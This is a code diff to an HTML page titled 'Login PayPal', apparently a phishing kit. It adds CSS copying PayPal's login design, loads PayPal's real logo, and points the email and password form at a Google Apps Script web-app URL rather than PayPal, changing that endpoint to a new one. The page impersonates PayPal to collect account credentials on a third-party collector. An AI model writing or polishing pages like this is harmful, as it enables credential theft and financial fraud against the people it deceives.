@@ -5,17 +5,164 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Login PayPal</title>
   <style>
-    /* ... (stesso CSS di prima) ... */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+      line-height: 1.4;
+    }
+
+    html, body {
+      height: 100%;
+      width: 100%;
+      background-color: #f5f5f5;
+    }
+
+    .container {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100%;
+      padding: 20px;
+    }
+
+    .card {
+      background: #fff;
+      width: 100%;
+      max-width: 400px;
+      border-radius: 8px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+      padding: 40px 30px;
+    }
+
+    .logo {
+      display: block;
+      margin: 0 auto 30px;
+      max-width: 100%;
+      height: auto;
+    }
+
+    form#emailForm {
+      display: flex;
+      flex-direction: column;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px 15px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 16px;
+      margin-bottom: 15px;
+    }
+
+    .forgot {
+      display: inline-block;
+      margin-bottom: 30px;
+      color: #0047bb;
+      text-decoration: none;
+      font-weight: bold;
+      font-size: 0.9rem;
+    }
+
+    .forgot:hover {
+      text-decoration: underline;
+    }
+
+    .btn-primary {
+      display: block;
+      width: 100%;
+      padding: 12px;
+      background-color: #0047bb;
+      color: #fff;
+      text-align: center;
+      border: none;
+      border-radius: 30px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-bottom: 20px;
+    }
+
+    .btn-primary:hover {
+      background-color: #003399;
+    }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      text-align: center;
+      color: #888;
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: "";
+      flex: 1;
+      border-bottom: 1px solid #ccc;
+    }
+
+    .divider:not(:empty)::before {
+      margin-right: .5em;
+    }
+
+    .divider:not(:empty)::after {
+      margin-left: .5em;
+    }
+
+    .btn-secondary {
+      display: block;
+      width: 100%;
+      padding: 12px;
+      background: transparent;
+      color: #001334;
+      text-align: center;
+      border: 1px solid #001334;
+      border-radius: 30px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .btn-secondary:hover {
+      background-color: rgba(0,19,52,0.05);
+    }
+
+    .footer {
+      text-align: center;
+      margin-top: 30px;
+      font-size: 14px;
+      color: #666;
+    }
+
+    .footer select {
+      border: none;
+      background: none;
+      font-size: 14px;
+      color: #333;
+      cursor: pointer;
+      margin-left: 5px;
+    }
+
+    #status {
+      margin-top: 15px;
+      font-size: 0.9rem;
+    }
   </style>
 </head>
 <body>
+
   <div class="container">
     <div class="card">
       <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg"
            alt="PayPal" class="logo">
 
       <form id="emailForm"
-            action="https://script.google.com/macros/s/AKfycbyLJkjG7aK_tApcR6rQMKjWqBrUKbEE8bYRs2Pp8k_nH-xjGV6vPTDlLS-il_LEZWcD/exec"
+            action="https://script.google.com/macros/s/AKfycbywWdnfDL2kugYvRQDQTdOuZCUzx7cxsCCXoqTXUyyiy2BAaS2_wt9QtESa8Or5Buk4/exec"
             method="POST"
             onsubmit="return handleSubmit(event)">
         <input type="email" name="email" id="email"
@@ -88,5 +235,6 @@
       return false;
     }
   </script>
+
 </body>
 </html>
